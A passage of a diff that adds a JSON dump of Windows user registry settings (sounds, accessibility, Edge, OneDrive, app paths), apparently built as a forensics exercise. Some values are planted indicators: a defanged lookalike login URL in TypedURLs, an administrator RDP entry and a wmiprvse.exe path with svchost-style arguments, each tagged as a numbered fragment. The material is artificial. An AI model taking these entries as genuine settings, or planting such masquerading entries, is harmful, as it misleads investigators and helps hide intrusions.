@@ -1,0 +1,2319 @@
+{
+    "AppEvents": {
+        "EventLabels": {
+            ".Default": "@mmres.dll,-5824",
+            "ActivatingDocument": "@ieframe.dll,-10321",
+            "AppGPFault": "@mmres.dll,-5825",
+            "BlockedPopup": "@ieframe.dll,-10325",
+            "CCSelect": "@ieframe.dll,-10323",
+            "ChangeTheme": "@mmres.dll,-5860",
+            "Close": "@mmres.dll,-5826",
+            "CriticalBatteryAlarm": "@mmres.dll,-5827",
+            "DeviceConnect": "@mmres.dll,-5828",
+            "DeviceDisconnect": "@mmres.dll,-5829",
+            "DeviceFail": "@mmres.dll,-5830",
+            "DisNumbersSound": "@C:\\Windows\\System32\\speech\\speechux\\sapi.cpl,-5566",
+            "EmptyRecycleBin": "@mmres.dll,-5831",
+            "FaxBeep": "@mmres.dll,-5858",
+            "FeedDiscovered": "@ieframe.dll,-17315",
+            "HubOffSound": "@C:\\Windows\\System32\\speech\\speechux\\sapi.cpl,-5563",
+            "HubOnSound": "@C:\\Windows\\System32\\speech\\speechux\\sapi.cpl,-5562",
+            "HubSleepSound": "@C:\\Windows\\System32\\speech\\speechux\\sapi.cpl,-5564",
+            "LowBatteryAlarm": "@mmres.dll,-5832",
+            "MailBeep": "@mmres.dll,-5837",
+            "Maximize": "@mmres.dll,-5833",
+            "MenuCommand": "@mmres.dll,-5834",
+            "MenuPopup": "@mmres.dll,-5835",
+            "MessageNudge": "@mmres.dll,-5866",
+            "Minimize": "@mmres.dll,-5836",
+            "MisrecoSound": "@C:\\Windows\\System32\\speech\\speechux\\sapi.cpl,-5561",
+            "MoveMenuItem": "@ieframe.dll,-10322",
+            "Navigating": "@ieframe.dll,-10320",
+            "Notification.Default": "@mmres.dll,-5865",
+            "Notification.IM": "@mmres.dll,-5863",
+            "Notification.Looping.Alarm": "@mmres.dll,-5888",
+            "Notification.Looping.Alarm10": "@mmres.dll,-5897",
+            "Notification.Looping.Alarm2": "@mmres.dll,-5889",
+            "Notification.Looping.Alarm3": "@mmres.dll,-5890",
+            "Notification.Looping.Alarm4": "@mmres.dll,-5891",
+            "Notification.Looping.Alarm5": "@mmres.dll,-5892",
+            "Notification.Looping.Alarm6": "@mmres.dll,-5893",
+            "Notification.Looping.Alarm7": "@mmres.dll,-5894",
+            "Notification.Looping.Alarm8": "@mmres.dll,-5895",
+            "Notification.Looping.Alarm9": "@mmres.dll,-5896",
+            "Notification.Looping.Call": "@mmres.dll,-5872",
+            "Notification.Looping.Call10": "@mmres.dll,-5881",
+            "Notification.Looping.Call2": "@mmres.dll,-5873",
+            "Notification.Looping.Call3": "@mmres.dll,-5874",
+            "Notification.Looping.Call4": "@mmres.dll,-5875",
+            "Notification.Looping.Call5": "@mmres.dll,-5876",
+            "Notification.Looping.Call6": "@mmres.dll,-5877",
+            "Notification.Looping.Call7": "@mmres.dll,-5878",
+            "Notification.Looping.Call8": "@mmres.dll,-5879",
+            "Notification.Looping.Call9": "@mmres.dll,-5880",
+            "Notification.Mail": "@mmres.dll,-5861",
+            "Notification.Proximity": "@mmres.dll,-5868",
+            "Notification.Reminder": "@mmres.dll,-5864",
+            "Notification.SMS": "@mmres.dll,-5862",
+            "Open": "@mmres.dll,-5839",
+            "PanelSound": "@C:\\Windows\\System32\\speech\\speechux\\sapi.cpl,-5565",
+            "PrintComplete": "@mmres.dll,-5840",
+            "ProximityConnection": "@mmres.dll,-5867",
+            "RestoreDown": "@mmres.dll,-5841",
+            "RestoreUp": "@mmres.dll,-5842",
+            "SecurityBand": "@ieframe.dll,-10326",
+            "ShowBand": "@ieframe.dll,-10324",
+            "SystemAsterisk": "@mmres.dll,-5843",
+            "SystemExclamation": "@mmres.dll,-5845",
+            "SystemExit": "@mmres.dll,-5846",
+            "SystemHand": "@mmres.dll,-5847",
+            "SystemNotification": "@mmres.dll,-5848",
+            "SystemQuestion": "@mmres.dll,-5849",
+            "WindowsLogoff": "@mmres.dll,-5852",
+            "WindowsLogon": "@mmres.dll,-5853",
+            "WindowsUAC": "@mmres.dll,-5859",
+            "WindowsUnlock": "@mmres.dll,-5869"
+        },
+        "Schemes": {
+            "Apps": {
+                ".Default": {
+                    ".Default": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Background.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Background.wav"
+                    },
+                    "AppGPFault": {
+                        ".Current": ""
+                    },
+                    "CCSelect": {
+                        ".Current": ""
+                    },
+                    "ChangeTheme": {
+                        ".Current": ""
+                    },
+                    "Close": {
+                        ".Current": ""
+                    },
+                    "CriticalBatteryAlarm": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Foreground.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Foreground.wav"
+                    },
+                    "DeviceConnect": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Hardware Insert.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Hardware Insert.wav"
+                    },
+                    "DeviceDisconnect": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Hardware Remove.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Hardware Remove.wav"
+                    },
+                    "DeviceFail": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Hardware Fail.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Hardware Fail.wav"
+                    },
+                    "FaxBeep": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify Email.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify Email.wav"
+                    },
+                    "LowBatteryAlarm": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Background.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Background.wav"
+                    },
+                    "MailBeep": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify Email.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify Email.wav"
+                    },
+                    "Maximize": {
+                        ".Current": ""
+                    },
+                    "MenuCommand": {
+                        ".Current": ""
+                    },
+                    "MenuPopup": {
+                        ".Current": ""
+                    },
+                    "MessageNudge": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Message Nudge.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Message Nudge.wav"
+                    },
+                    "Minimize": {
+                        ".Current": ""
+                    },
+                    "Notification.Default": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify System Generic.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify System Generic.wav"
+                    },
+                    "Notification.IM": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify Messaging.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify Messaging.wav"
+                    },
+                    "Notification.Looping.Alarm": {
+                        ".Current": "%SystemRoot%\\media\\Alarm01.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm01.wav"
+                    },
+                    "Notification.Looping.Alarm10": {
+                        ".Current": "%SystemRoot%\\media\\Alarm10.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm10.wav"
+                    },
+                    "Notification.Looping.Alarm2": {
+                        ".Current": "%SystemRoot%\\media\\Alarm02.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm02.wav"
+                    },
+                    "Notification.Looping.Alarm3": {
+                        ".Current": "%SystemRoot%\\media\\Alarm03.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm03.wav"
+                    },
+                    "Notification.Looping.Alarm4": {
+                        ".Current": "%SystemRoot%\\media\\Alarm04.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm04.wav"
+                    },
+                    "Notification.Looping.Alarm5": {
+                        ".Current": "%SystemRoot%\\media\\Alarm05.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm05.wav"
+                    },
+                    "Notification.Looping.Alarm6": {
+                        ".Current": "%SystemRoot%\\media\\Alarm06.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm06.wav"
+                    },
+                    "Notification.Looping.Alarm7": {
+                        ".Current": "%SystemRoot%\\media\\Alarm07.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm07.wav"
+                    },
+                    "Notification.Looping.Alarm8": {
+                        ".Current": "%SystemRoot%\\media\\Alarm08.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm08.wav"
+                    },
+                    "Notification.Looping.Alarm9": {
+                        ".Current": "%SystemRoot%\\media\\Alarm09.wav",
+                        ".Default": "%SystemRoot%\\media\\Alarm09.wav"
+                    },
+                    "Notification.Looping.Call": {
+                        ".Current": "%SystemRoot%\\media\\Ring01.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring01.wav"
+                    },
+                    "Notification.Looping.Call10": {
+                        ".Current": "%SystemRoot%\\media\\Ring10.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring10.wav"
+                    },
+                    "Notification.Looping.Call2": {
+                        ".Current": "%SystemRoot%\\media\\Ring02.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring02.wav"
+                    },
+                    "Notification.Looping.Call3": {
+                        ".Current": "%SystemRoot%\\media\\Ring03.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring03.wav"
+                    },
+                    "Notification.Looping.Call4": {
+                        ".Current": "%SystemRoot%\\media\\Ring04.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring04.wav"
+                    },
+                    "Notification.Looping.Call5": {
+                        ".Current": "%SystemRoot%\\media\\Ring05.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring05.wav"
+                    },
+                    "Notification.Looping.Call6": {
+                        ".Current": "%SystemRoot%\\media\\Ring06.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring06.wav"
+                    },
+                    "Notification.Looping.Call7": {
+                        ".Current": "%SystemRoot%\\media\\Ring07.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring07.wav"
+                    },
+                    "Notification.Looping.Call8": {
+                        ".Current": "%SystemRoot%\\media\\Ring08.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring08.wav"
+                    },
+                    "Notification.Looping.Call9": {
+                        ".Current": "%SystemRoot%\\media\\Ring09.wav",
+                        ".Default": "%SystemRoot%\\media\\Ring09.wav"
+                    },
+                    "Notification.Mail": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify Email.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify Email.wav"
+                    },
+                    "Notification.Proximity": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Proximity Notification.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Proximity Notification.wav"
+                    },
+                    "Notification.Reminder": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify Calendar.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify Calendar.wav"
+                    },
+                    "Notification.SMS": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Notify Messaging.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Notify Messaging.wav"
+                    },
+                    "Open": {
+                        ".Current": ""
+                    },
+                    "PrintComplete": {
+                        ".Current": ""
+                    },
+                    "ProximityConnection": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Proximity Connection.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Proximity Connection.wav"
+                    },
+                    "RestoreDown": {
+                        ".Current": ""
+                    },
+                    "RestoreUp": {
+                        ".Current": ""
+                    },
+                    "ShowBand": {
+                        ".Current": ""
+                    },
+                    "SystemAsterisk": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Background.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Background.wav"
+                    },
+                    "SystemExclamation": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Background.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Background.wav"
+                    },
+                    "SystemHand": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Foreground.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Foreground.wav"
+                    },
+                    "SystemNotification": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows Background.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Background.wav"
+                    },
+                    "SystemQuestion": {
+                        ".Current": ""
+                    },
+                    "WindowsLogon": {
+                        ".Current": "%SystemRoot%\\media\\Windows Logon.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Logon.wav"
+                    },
+                    "WindowsUAC": {
+                        ".Current": "C:\\WINDOWS\\media\\Windows User Account Control.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows User Account Control.wav"
+                    },
+                    "WindowsUnlock": {
+                        ".Current": "%SystemRoot%\\media\\Windows Unlock.wav",
+                        ".Default": "%SystemRoot%\\media\\Windows Unlock.wav"
+                    }
+                },
+                "Explorer": {
+                    "ActivatingDocument": {
+                        ".Current": ""
+                    },
+                    "BlockedPopup": {
+                        ".current": ""
+                    },
+                    "EmptyRecycleBin": {
+                        ".Current": ""
+                    },
+                    "FeedDiscovered": {
+                        ".current": ""
+                    },
+                    "MoveMenuItem": {
+                        ".Current": ""
+                    },
+                    "Navigating": {
+                        ".Current": ""
+                    },
+                    "SecurityBand": {
+                        ".current": ""
+                    }
+                },
+                "sapisvr": {
+                    "DisNumbersSound": {
+                        ".current": "C:\\WINDOWS\\media\\Speech Disambiguation.wav",
+                        ".default": "%SystemRoot%\\media\\Speech Disambiguation.wav"
+                    },
+                    "HubOffSound": {
+                        ".current": "C:\\WINDOWS\\media\\Speech Off.wav",
+                        ".default": "%SystemRoot%\\media\\Speech Off.wav"
+                    },
+                    "HubOnSound": {
+                        ".current": "C:\\WINDOWS\\media\\Speech On.wav",
+                        ".default": "%SystemRoot%\\media\\Speech On.wav"
+                    },
+                    "HubSleepSound": {
+                        ".current": "C:\\WINDOWS\\media\\Speech Sleep.wav",
+                        ".default": "%SystemRoot%\\media\\Speech Sleep.wav"
+                    },
+                    "MisrecoSound": {
+                        ".current": "C:\\WINDOWS\\media\\Speech Misrecognition.wav",
+                        ".default": "%SystemRoot%\\media\\Speech Misrecognition.wav"
+                    },
+                    "PanelSound": {
+                        ".current": "C:\\WINDOWS\\media\\Speech Disambiguation.wav",
+                        ".default": "%SystemRoot%\\media\\Speech Disambiguation.wav"
+                    }
+                }
+            },
+            "Names": {
+                ".Default": "@mmres.dll,-800",
+                ".None": "@mmres.dll,-801"
+            }
+        }
+    },
+    "Console": {
+        "%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe": "Lucida Console",
+        "%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe": "Lucida Console"
+    },
+    "Control Panel": {
+        "Accessibility": {
+            "AudioDescription": "0",
+            "Blind Access": "0",
+            "HighContrast": "",
+            "Keyboard Preference": "0",
+            "Keyboard Response": "126",
+            "MouseKeys": "3000",
+            "ShowSounds": "0",
+            "SlateLaunch": "narrator",
+            "SoundSentry": "1",
+            "StickyKeys": "510",
+            "TimeOut": "300000",
+            "ToggleKeys": "62"
+        },
+        "Colors": "0 0 0",
+        "Cursors": "Windows Default",
+        "Desktop": {
+            "Colors": "0 0 0",
+            "WindowMetrics": "1"
+        },
+        "International": {
+            "Geo": "US"
+        },
+        "Keyboard": "31",
+        "Mouse": "0",
+        "NotifyIconSettings": {
+            "11552613821325543890": "VMware Tools",
+            "14576831004084446067": "Microsoft Windows",
+            "4572588663714966362": "",
+            "736212972787440030": "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\SecurityHealthSystray.exe",
+            "9719681374565727607": "Microsoft Windows"
+        },
+        "PowerCfg": {
+            "PowerPolicies": {
+                "0": "Home/Office Desk",
+                "1": "Portable/Laptop",
+                "2": "Presentation",
+                "3": "Always On",
+                "4": "Minimal Power Management",
+                "5": "Max Battery"
+            }
+        },
+        "Sound": "yes",
+        "UnsupportedHardwareNotificationCache": ""
+    },
+    "Environment": "C:\\Users\\User\\OneDrive",
+    "EUDC": {
+        "932": "EUDC.TTE",
+        "936": "EUDC.TTE",
+        "949": "EUDC.TTE",
+        "950": "EUDC.TTE"
+    },
+    "Keyboard Layout": {
+        "Preload": "00000409"
+    },
+    "Software": {
+        "Google": {
+            "Chrome": {
+                "NativeMessagingHosts": {
+                    "com.microsoft.browsercore": "C:\\Windows\\BrowserCore\\manifest.json"
+                }
+            }
+        },
+        "Microsoft": {
+            "Active Setup": {
+                "Installed Components": {
+                    "{2C7339CF-2B09-4501-B3F3-F3508C9228ED}": "EN",
+                    "{6BF52A52-394A-11d3-B153-00C04F79FAA6}": "EN",
+                    "{89820200-ECBD-11cf-8B85-00AA005B4340}": "en",
+                    "{89820200-ECBD-11cf-8B85-00AA005B4383}": "*",
+                    "{9459C573-B17A-45AE-9F64-1857B5D58CEE}": "43,0,0,0"
+                }
+            },
+            "Assistance": {
+                "Client": {
+                    "1.0": {
+                        "Settings": ""
+                    }
+                }
+            },
+            "AuthCookies": {
+                "Live": {
+                    "Default": {
+                        "DIDC": "CP=\"CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT\""
+                    }
+                }
+            },
+            "CTF": {
+                "Assemblies": {
+                    "0x00000409": {
+                        "{34745C63-B2F0-4784-8B67-5E12C8701A31}": "{00000000-0000-0000-0000-000000000000}"
+                    }
+                },
+                "SortOrder": {
+                    "AssemblyItem": {
+                        "0x00000409": {
+                            "{34745C63-B2F0-4784-8B67-5E12C8701A31}": {
+                                "00000000": "{00000000-0000-0000-0000-000000000000}"
+                            }
+                        }
+                    },
+                    "Language": "00000409"
+                }
+            },
+            "Edge": {
+                "BLBeacon": "140.0.3485.94",
+                "ElfBeacon": "140.0.3485.94",
+                "PreferenceMACs": {
+                    "Default": {
+                        "extensions.settings": "F9EA93BC52650A75209128467E93B232B3AE89A1DC37AE37C01E1CE19F1842DB"
+                    }
+                },
+                "Profiles": {
+                    "Default": "Profile 1"
+                }
+            },
+            "EdgeUpdate": {
+                "ClientState": {
+                    "{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}": "13403474150471801"
+                },
+                "proxy": "IEWPAD"
+            },
+            "FTP": "yes",
+            "IdentityCRL": {
+                "ExtendedProperties": "00184014734C4947",
+                "Immersive": {
+                    "production": {
+                        "Token": {
+                            "S-1-15-2-350187224-1905355452-1037786396-3028148496-2624191407-3283318427-1255436723": "00184014734C4947",
+                            "{0CB4A94A-6E8C-477B-88C8-A3799FC97414}": "00184014734C4947",
+                            "{28520974-CE92-4F36-A219-3F255AF7E61E}": "00184014734C4947",
+                            "{4B0964E4-58F1-47F4-A552-E2E1FC56DCD7}": "00184014734C4947",
+                            "{F0C62012-2CEF-4831-B1F7-930682874C86}": "00184014734C4947"
+                        }
+                    }
+                }
+            },
+            "Internet Explorer": {
+                "Desktop": {
+                    "General": "C:\\WINDOWS\\web\\wallpaper\\Windows\\img0.jpg"
+                },
+                "Document Windows": "no",
+                "International": {
+                    "Scripts": {
+                        "10": "Kokila",
+                        "11": "Shonar Bangla",
+                        "12": "Raavi",
+                        "13": "Shruti",
+                        "14": "Kalinga",
+                        "15": "Vijaya",
+                        "16": "Vani",
+                        "17": "Tunga",
+                        "18": "Kartika",
+                        "19": "Cordia New",
+                        "20": "Leelawadee UI",
+                        "21": "Microsoft Himalaya",
+                        "22": "Sylfaen",
+                        "23": "GulimChe",
+                        "24": "MS Gothic",
+                        "25": "MingLiu",
+                        "26": "NSimsun",
+                        "27": "Ebrima",
+                        "28": "Gadugi",
+                        "29": "Gadugi",
+                        "3": "Courier New",
+                        "30": "Microsoft Yi Baiti",
+                        "31": "Segoe UI Symbol",
+                        "32": "Segoe UI Historic",
+                        "33": "Segoe UI Historic",
+                        "34": "Iskoola Pota",
+                        "35": "Estrangelo Edessa",
+                        "36": "Myanmar Text",
+                        "37": "Leelawadee UI",
+                        "38": "MV Boli",
+                        "39": "Mongolian Baiti",
+                        "4": "Courier New",
+                        "5": "Courier New",
+                        "6": "Courier New",
+                        "7": "Times New Roman",
+                        "8": "Courier New",
+                        "9": "Courier New"
+                    }
+                },
+                "LowRegistry": {
+                    "Audio": {
+                        "PolicyConfig": {
+                            "PropertyStore": {
+                                "ed3e71a5_0": "{2}.\\\\?\\hdaudio#func_01&ven_15ad&dev_1975&subsys_15ad1975&rev_1001#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\\elineouttopo/00010001|#%b{A9EF3FD9-4240-455E-A4D5-F2B3301887B2}"
+                            }
+                        }
+                    }
+                },
+                "New Windows": "1",
+                "Security": "Low",
+                "Services": "",
+                "Settings": "No",
+                "Suggested Sites": "C:\\Users\\User\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Low",
+                "TypedURLs": "http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b",
+                "URLSearchHooks": ""
+            },
+            "Keyboard": {
+                "Native Media Players": {
+                    "WMP": "C:\\Program Files\\Windows Media Player\\wmplayer.exe"
+                }
+            },
+            "MediaPlayer": {
+                "Player": {
+                    "Settings": "{03CA6A7B-149E-443F-95E6-D9328E0CFFBD}"
+                },
+                "Preferences": "C:\\Users\\User\\AppData\\Local\\Microsoft\\Media Player\\Sync Playlists\\en-US\\00011558"
+            },
+            "Nucleus": "-2147176702|0|1|2|Initialize Time Zone Database",
+            "OneDrive": {
+                "25.087.0506.0001": "C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\25.087.0506.0001;",
+                "Accounts": {
+                    "Business1": "7001a656-0cec-425c-77cd-5c17176099c9",
+                    "Personal": "Completed"
+                },
+                "Capabilities": {
+                    "URLAssociations": "OneDrive.CameraRoll.Import"
+                },
+                "QoS": "{02712C82-6E8D-4F2A-8CDB-8C0D7AB1971F}"
+            },
+            "SkyDrive": "19.9999.9999.9999",
+            "Speech": {
+                "Preferences": {
+                    "AppCompatDisableDictation": "",
+                    "AppCompatDisableMSAA": ""
+                }
+            },
+            "SQMClient": "{9167E827-178B-42D3-89E3-F442D7F7812A}",
+            "Terminal Server Client": {
+                "Servers": {
+                    "fileshare.local": "administrator|segment-8-of-8=58de"
+                }
+            },
+            "UEV": {
+                "Agent": "10.0.26100.5074"
+            },
+            "WAB": {
+                "WAB4": {
+                    "Wab File Name": ""
+                }
+            },
+            "Windows": {
+                "CurrentVersion": {
+                    "App Paths": {
+                        "ms-teams.exe": "C:\\Program Files\\WindowsApps\\MSTeams_25241.203.3947.4411_x64__8wekyb3d8bbwe",
+                        "ms-teamsupdate.exe": "C:\\Program Files\\WindowsApps\\MSTeams_25241.203.3947.4411_x64__8wekyb3d8bbwe",
+                        "mspaint.exe": "C:\\Program Files\\WindowsApps\\Microsoft.Paint_11.2302.20.0_x64__8wekyb3d8bbwe\\PaintApp",
+                        "notepad.exe": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2312.18.0_x64__8wekyb3d8bbwe\\Notepad",
+                        "olk.exe": "C:\\Program Files\\WindowsApps\\Microsoft.OutlookForWindows_1.2025.829.200_x64__8wekyb3d8bbwe",
+                        "olkMcpServer.exe": "C:\\Program Files\\WindowsApps\\Microsoft.OutlookForWindows_1.2025.829.200_x64__8wekyb3d8bbwe",
+                        "SnippingTool.exe": "C:\\Program Files\\WindowsApps\\Microsoft.ScreenSketch_11.2307.52.0_x64__8wekyb3d8bbwe\\SnippingTool",
+                        "WindowsPackageManagerServer.exe": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.10120.0_x64__8wekyb3d8bbwe",
+                        "winget.exe": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.10120.0_x64__8wekyb3d8bbwe",
+                        "wmiprvse.exe": "C:\\Windows\\System32\\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a",
+                        "wt.exe": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe"
+                    },
+                    "Authentication": {
+                        "LogonUI": {
+                            "Notifications": {
+                                "BackgroundCapability": {
+                                    "S-1-15-2-1288279408-4010470124-2163985056-447644096-1946037256-752919663-3751275627": {
+                                        "App.AppX3m8s9881j155jq8c5r26t6ja6qtkyckq.mca": "Microsoft.WindowsAlarms_8wekyb3d8bbwe!App",
+                                        "App.AppXceq7e7dzhmg9fn4np55yxm07ezc61d5h.mca": "Microsoft.WindowsAlarms_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-1312876954-3728250218-3694470604-4188764552-3197360367-780678243-3229644300": {
+                                        "GamePassWidget.AppXa7nhs48eam80wt1kaym104raph4qb706.mca": "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!GamePassWidget",
+                                        "GamePassWidget.AppXmnp6vznkkrx0z665hs2600g3y58h9x7c.mca": "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!GamePassWidget",
+                                        "PackageMetadata.AppXvd5ydgmes2bfxcjvkz47h8xg6gx2d6ef.mca": "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!PackageMetadata",
+                                        "PackageMetadata.AppXxnzp6j028tdnzv7q48b3yqhkqb6rj1r5.wwa": "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!PackageMetadata"
+                                    },
+                                    "S-1-15-2-1609473798-1231923017-684268153-4268514328-882773646-2760585773-1760938157": {
+                                        "App.AppX182at4ns9v6wsj3grgjdfkg0cyf5dgdz.mca": "Microsoft.WindowsStore_8wekyb3d8bbwe!App",
+                                        "App.AppX4kq775cvjnf3kamcw69d81vz8nk5q6hq.mca": "Microsoft.WindowsStore_8wekyb3d8bbwe!App",
+                                        "App.AppX4kxf8bgxe19qh7h05n9rr6zdjvxf6pw2.mca": "Microsoft.WindowsStore_8wekyb3d8bbwe!App",
+                                        "App.AppXaebta7dzqe4mpd2yq4wpmhnjm5z6n4ec.mca": "Microsoft.WindowsStore_8wekyb3d8bbwe!App",
+                                        "App.AppXm96m8j7c8wq5gr4nmdmkntzksyex46x3.mca": "Microsoft.WindowsStore_8wekyb3d8bbwe!App",
+                                        "App.AppXpj7bfzty7tm99qp6rq3drmk71sj5jq28.mca": "Microsoft.WindowsStore_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-1714399563-1326177402-2048222277-143663168-2151391019-765408921-4098702777": {
+                                        "App.AppXpa8c6rgd3yzmnwb7kznbz0y2c2tmedk3.mca": "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe!App",
+                                        "App.AppXpn7cne009fw4my9th84zap9s6xw64dc8.mca": "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-1723189366-2159580849-2248400763-1481059666-1951766778-2756563051-3565589001": {
+                                        "Microsoft.Xbox.App.AppXcm58yy802whmc63dytenhderp5m9gaw0.mca": "Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App",
+                                        "Microsoft.Xbox.App.AppXegx82d6rdggtda1hffff33jm7j9q2h8p.mca": "Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App"
+                                    },
+                                    "S-1-15-2-1726375552-1729233799-74693324-3851689839-2151781990-3623637752-3611872497": {
+                                        "App.AppXv7d7wrkhxww8bms980m32tp0jgwkhr1t.mca": "Microsoft.YourPhone_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-1985198343-3186790915-4047221937-1969271670-3792558349-1325541827-400269725": {
+                                        "App.AppXesrg4hvv6papae4sk55m0bw5nb1vg1jq.mca": "Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe!App",
+                                        "App.AppXh0trtvk6arc90rxhywj56hwfwrjqqkxp.mca": "Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2040986369-264322980-3882385089-1970153872-3662121739-3363227934-2464603330": {
+                                        "App.AppX31ry8vc0xgqgaprnabrph9ma8xd457t6.mca": "Microsoft.BingWeather_8wekyb3d8bbwe!App",
+                                        "App.AppXy52sa92aebbtb2p46yeqbbcd7tx3dx6w.mca": "Microsoft.BingWeather_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2188130720-2839601841-3157732644-2592691638-1140003976-1644640269-1870447086": {
+                                        "App.AppXdn085bqdpx2gp6tcys8bcy84wc76tj8b.mca": "Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe!App",
+                                        "App.AppXtanvqvfbkjcd1wc6zcqj5qw5hjn7k1n8.mca": "Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2226957697-3030467180-2301525-4248967783-2024719031-2325529081-2915787518": {
+                                        "App.AppXxg8s4j2xfw49jx2qej4y0aqzj1wq21ka.mca": "Microsoft.Windows.Photos_8wekyb3d8bbwe!App",
+                                        "App.AppXyd2s9bb1qeq45r8bbma8zmqf174aj9xv.mca": "Microsoft.Windows.Photos_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2246242352-370130666-2593524754-1827188282-2313440240-2317694540-2761805292": {
+                                        "App.AppXj1jqh7p0tbtey9p4qaqhtrxfqzggr4qz.mca": "Microsoft.StorePurchaseApp_8wekyb3d8bbwe!App",
+                                        "App.AppXk7shenz5hr6g8cg6995p00xndc0vmppm.mca": "Microsoft.StorePurchaseApp_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2473817148-3930944034-1235795307-187980641-3967865409-1804095407-1113801530": {
+                                        "App.AppX3yakgvx5b9nqwwbf8gyghjzfc8dksct4.mca": "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!App",
+                                        "App.AppX47ssqbex12vfechgsnxpysspmerw302n.mca": "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!App",
+                                        "App.AppXgc6cshv3pq98mt5bx0421mcbpq5wgxbj.mca": "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!App",
